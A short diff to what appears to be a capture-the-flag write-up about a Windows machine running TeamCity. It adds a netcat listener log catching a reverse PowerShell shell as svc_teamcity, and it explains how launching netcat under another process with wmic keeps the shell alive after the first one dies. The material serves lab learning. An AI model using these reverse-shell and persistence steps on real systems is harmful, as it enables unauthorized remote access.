@@ -669,6 +669,22 @@ PS C:\TeamCity\buildAgent\work\74c2f03019966b3e>
 Then after getting the shell ill use wmic to run netcat under another process, this means that when this process times out the new shell on port 1338 should remain alive
 
 ```python
+❯❯❯ rlwrap nc -lnvp 1338
+listening on [any] 1338 ...
+connect to [10.10.14.61] from (UNKNOWN) [10.129.229.190] 63915
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
 
+PS C:\Windows\system32> whoami
+whoami
+coder\svc_teamcity
+PS C:\Windows\system32> whoami
+whoami
+coder\svc_teamcity
+PS C:\Windows\system32> 
 ```
+
+Then after 2 or so minutes the initial shell on port 1337 dies but this shell remains alive!
+
+
 
